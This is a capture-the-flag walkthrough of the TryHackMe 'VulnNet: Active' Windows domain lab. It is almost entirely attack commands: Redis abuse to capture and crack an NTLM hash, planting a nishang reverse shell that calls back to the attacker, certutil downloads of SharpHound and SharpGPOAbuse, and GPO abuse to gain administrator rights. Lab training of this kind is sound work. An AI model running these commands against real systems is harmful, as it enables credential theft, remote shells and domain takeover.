# VulnNet: Active

**Room Link:** [https://tryhackme.com/r/room/vulnnetactive](https://tryhackme.com/r/room/vulnnetactive)



## **Scans** <a href="#scans" id="scans"></a>

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

## **TCP/139 - NetBIOS** <a href="#tcp-139-netbios" id="tcp-139-netbios"></a>

**Kali**

```
nbtscan $VICTIM
```

<figure><img src="../../.gitbook/assets/image (874).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
enum4linux $VICTIM
```

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>



## **TCP/445 - SMB**

No results. Couldn't login anonymously.&#x20;

**Kali**

```
smbclient -L //$VICTIM/ 
```

## **TCP/6379 - Redis** <a href="#tcp-139-netbios" id="tcp-139-netbios"></a>

Added active.thm

**Kali**

```
redis-cli -h active.thm
```

**Kali(redis-cli)**

```
config get *
```

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (879).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
responder -I ens5 -dvw  
```

**Kali(redis-cli)**

```
eval "dofile('//$KALI/share')" 0
```

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>



## **TCP/445 - SMB**

**Kali**

```
smbclient -L //$VICTIM/ -U enterprise-security
Password: sand_0873959498
```

<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>

#### Download files <a href="#download-files-1" id="download-files-1"></a>

**Kali**

```
smbclient \\\\$VICTIM\\Enterprise-Share -U enterprise-security
Password: sand_0873959498
```

**Kali(smbclient)**

```
ls
mget *
```

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cat PurgeIrrelevantData_1826.ps1
```

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

## **Initial Shell**

**Kali**

```
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells/
subl Invoke-PowerShellTcp.ps1
```

**Kali(subl)**

```
Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
```

<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
cp Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1
```

**Upload payload**

**Kali(smbclient)**

```
put PurgeIrrelevantData_1826.ps1
```

After a few moments we get a connection

**Kali**

<pre><code><strong>rlwrap nc -lvnp 4444
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation&#x20;

[https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation](https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation)



**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git
cp BloodHound/Collectors/SharpHound.ps1 .
python2 -m SimpleHTTPServer 82
```

**Victim(Powershell)**

```
certutil -urlcache -f http://$KALI:82/SharpHound.ps1 SharpHound.ps1
powershell -ep bypass
.\SharpHound.ps1 
```

**Kali**

```
git clone https://github.com/BloodHoundAD/BloodHound.git
cp BloodHound/Collectors/SharpHound.exe .
python2 -m SimpleHTTPServer 82
```







**Kali**

```
git clone https://github.com/byronkg/SharpGPOAbuse.git
cp SharpGPOAbuse/SharpGPOAbuse-master/SharpGPOAbuse.exe .
python2 -m SimpleHTTPServer 82
```

**Victim(Powershell)**

```
certutil -urlcache -f http://$KALI:82/SharpGPOAbuse.exe SharpGPOAbuse.exe
```



**Victim(Powershell)**

```
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

<figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>



**Victim(Powershell)**

```
 gpupdate /force
```

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
 psexec.py enterprise-security:sand_0873959498@$VICTIM
```

